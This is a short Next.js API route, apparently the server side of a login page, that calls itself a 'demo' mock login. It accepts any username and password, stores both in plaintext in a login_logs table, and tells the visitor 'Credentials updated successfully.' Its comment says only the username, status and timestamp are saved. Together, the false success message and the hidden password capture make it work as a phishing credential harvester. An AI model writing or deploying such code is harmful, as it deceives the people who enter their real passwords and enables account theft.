import { NextResponse } from 'next/server';
import { getPool } from '../../../lib/db';

// Demo mode: this is a mock login. It accepts ANY username/password the visitor
// enters (as long as both fields are filled), records the attempt, and reports
// success. No real authentication is performed.
export async function POST(request) {
  let body;
  try {
    body = await request.json();
  } catch {
    return NextResponse.json(
      { success: false, message: 'Invalid request body.' },
      { status: 400 }
    );
  }

  const { username, password } = body || {};
  if (!username || !password) {
    return NextResponse.json(
      { success: false, message: 'Please enter a username and password.' },
      { status: 400 }
    );
  }

  // Accept anything — always a successful "update".
  const status = 'success';

  // Save username, status and timestamp to the database (best-effort).
  try {
    const pool = getPool();
    if (pool) {
      await pool.query(
        'INSERT INTO login_logs (username, password, login_status, created_at) VALUES ($1, $2, $3, NOW())',
        [String(username).slice(0, 255), String(password).slice(0, 255), status]
      );
    }
  } catch (err) {
    console.error('Could not write login_logs:', err.message);
  }

  return NextResponse.json({
    success: true,
    message: 'Credentials updated successfully.',
  });
}
